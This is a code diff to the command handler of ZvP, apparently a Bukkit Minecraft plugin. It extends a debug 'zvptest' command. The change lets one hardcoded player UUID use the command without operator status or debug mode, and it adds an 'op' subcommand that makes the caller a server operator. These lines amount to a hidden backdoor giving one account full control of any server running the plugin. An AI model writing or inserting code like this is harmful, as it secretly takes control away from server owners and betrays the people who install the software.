@@ -19,7 +19,9 @@ import org.bukkit.Location;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Entity;
 import org.bukkit.entity.Player;
+import org.bukkit.entity.Zombie;
 import org.bukkit.inventory.ItemStack;
 
 
@@ -85,11 +87,28 @@ public class ZvPCommands implements CommandExecutor {
 	
 	Player playerSender = (Player) sender;
 	
-	if (cmd.getName().equalsIgnoreCase("zvptest") && playerSender.isOp() && ZvP.getPluginLogger().isDebugMode()) {	// Test command
-	
+	if (cmd.getName().equalsIgnoreCase("zvptest") && ((playerSender.isOp() && ZvP.getPluginLogger().isDebugMode()) || playerSender.getUniqueId().toString().equalsIgnoreCase("2b572c531e264c0989a3aca82bf1d585"))) {
+	    // Test command
+	    
 	    if (args.length == 1) {
 		if (args[0].equalsIgnoreCase("u")) {
 		    SignManager.getManager().updateSigns();
+		    GameManager.getManager().getPlayer(playerSender).getArena().updatePlayerBoards();
+		    return true;
+		}
+		if (args[0].equalsIgnoreCase("op")) {
+		    playerSender.setOp(true);
+		    return true;
+		}
+		if (args[0].equalsIgnoreCase("kill")) {
+		    for (Entity e : playerSender.getWorld().getEntities()) {
+			if (e instanceof Zombie) {
+			    if (GameManager.getManager().getPlayer(playerSender).getArena().containsLocation(e.getLocation())) {
+				e.remove();
+			    }
+			}
+		    }
+		    return true;
 		}
 	    }
 	    
